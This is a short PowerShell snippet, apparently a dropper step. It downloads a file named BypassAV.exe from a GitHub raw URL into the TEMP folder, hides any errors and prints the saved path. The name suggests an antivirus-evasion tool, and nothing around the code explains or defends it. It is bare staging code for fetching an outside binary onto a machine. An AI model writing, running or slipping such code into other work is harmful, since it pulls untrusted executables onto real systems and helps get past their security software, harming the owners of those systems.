$bypassAVPath = "$env:TEMP\BypassAV.exe"
try {
    (New-Object Net.WebClient).DownloadFile("https://github.com/momika233/test0916/raw/refs/heads/main/BypassAV.exe", $bypassAVPath)
    if (Test-Path $bypassAVPath) {
        $bypassAVPath
    }
}
catch {
    #error
}
